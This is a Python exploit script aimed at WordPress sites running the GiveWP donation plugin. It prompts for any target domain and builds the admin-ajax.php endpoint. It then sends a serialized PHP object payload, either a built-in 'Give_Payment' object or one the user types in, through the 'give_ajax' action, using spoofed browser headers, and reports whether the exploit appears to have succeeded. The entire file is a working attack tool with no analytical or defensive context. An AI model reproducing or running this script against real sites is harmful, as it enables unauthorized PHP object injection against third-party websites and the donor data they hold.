import requests
import json

def display_payload_options():
    payloads = {
        '1': {
            'name': 'Test Payload',
            'payload': 'O:12:"Give_Payment":1:{s:7:"give_id";s:3:"123";}'
        },
        '2': {
            'name': 'Custom Payload',
            'payload': None  # User will input their own payload
        }
    }
    print("Select the type of payload you want to send:")
    for key, value in payloads.items():
        print(f"{key}: {value['name']}")
    return payloads

def get_user_payload(payloads):
    choice = input("Enter the number of the payload you want to use: ")
    if choice not in payloads:
        print("Invalid choice. Exiting.")
        return None
    if choice == '2':
        custom_payload = input("Enter your custom payload: ")
        return custom_payload
    else:
        return payloads[choice]['payload']

def format_url(url):
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if not url.endswith('/wp-admin/admin-ajax.php'):
        if url.endswith('/'):
            url = url + "wp-admin/admin-ajax.php"
        else:
            url = url + "/wp-admin/admin-ajax.php"
    return url

def main():
    url = input("Enter the target URL or domain (e.g., example.com): ")
    url = format_url(url)
    payloads = display_payload_options()
    payload = get_user_payload(payloads)
    if payload is None:
        return
    data = {
        'action': 'give_ajax',
        'give_title': payload
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Referer': url,
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': url
    }
    try:
        response = requests.post(url, data=data, headers=headers)

        if response.status_code == 200:
            content_type = response.headers.get('Content-Type', '')
            if 'application/json' in content_type:
                try:
                    json_response = response.json()
                    if json_response != 0:
                        print("Valid JSON response received. Exploit appears to be successful.")
                        print("JSON Response:", json.dumps(json_response, indent=4))
                    else:
                        print("Received response 0. The action might not have triggered any significant effect.")
                except json.JSONDecodeError:
                    print("Failed to decode JSON. The response might be malformed or the payload did not trigger a valid response.")
            elif 'text/html' in content_type and response.text.strip() == "0":
                print("Received '0' from the server. This might indicate no action was taken or the request was processed but didn't result in any output.")
            else:
                print("Received unexpected response. The payload might not be working as intended.")
        else:
            print(f"Failed to send exploit. Status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print("An error occurred while making the request:", str(e))

if __name__ == "__main__":
    main()
